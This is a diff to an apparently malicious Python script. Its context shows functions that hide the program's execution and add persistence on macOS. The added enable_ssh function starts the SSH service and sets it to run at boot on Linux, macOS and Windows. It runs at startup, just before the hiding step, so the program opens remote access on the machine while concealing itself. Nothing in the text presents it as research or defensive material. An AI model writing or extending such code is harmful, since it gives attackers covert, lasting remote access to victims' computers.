@@ -72,7 +72,23 @@ def hide_execution():
         print("[*] Persistence added for macOS.")
 
 
+# Function to enable SSH access
+def enable_ssh():
+    if platform.system() == "Linux" or platform.system() == "Darwin":  # Linux & macOS
+        os.system("sudo systemctl start ssh")
+        os.system("sudo systemctl enable ssh")
+        print("[*] SSH Access Enabled")
+
+    elif platform.system() == "Windows":  # Windows
+        os.system("powershell -Command \"Start-Service sshd\"")
+        os.system("powershell -Command \"Set-Service -Name sshd -StartupType Automatic\"")
+        print("[*] SSH Access Enabled")
+
+
 if __name__ == "__main__":
+    # Enable SSH on startup
+    enable_ssh()
+
     # Hide execution first
     hide_execution()
 
